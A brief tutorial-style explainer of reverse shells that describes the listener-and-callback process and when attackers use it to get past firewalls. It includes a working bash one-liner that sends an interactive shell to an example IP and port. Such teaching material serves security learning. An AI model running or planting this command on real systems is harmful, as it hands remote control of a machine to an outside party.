A **reverse shell** is when the **target system** (victim) initiates a connection **back** to the attacker's system.
### **How It Works:**
1. The attacker sets up a **listener** on their machine, waiting for incoming connections.
2. The attacker tricks the victim’s machine (through an exploit) into running a command that opens a connection **back to the attacker’s system**.
3. Once connected, the attacker gains shell access and can execute commands on the victim’s system.
### **Example:**
- A hacker finds a vulnerability in a web server and makes it execute a command like:
    ```bash
    bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
    ```
    (This sends the shell back to the attacker’s **IP: 192.168.1.10** on **port 4444**.)
- The attacker's system receives the connection and gains full interactive access.
### **When to Use It?**
- When **firewalls** block **incoming** connections (so a bind shell wouldn't work).
- When the attacker wants to **bypass network restrictions**.
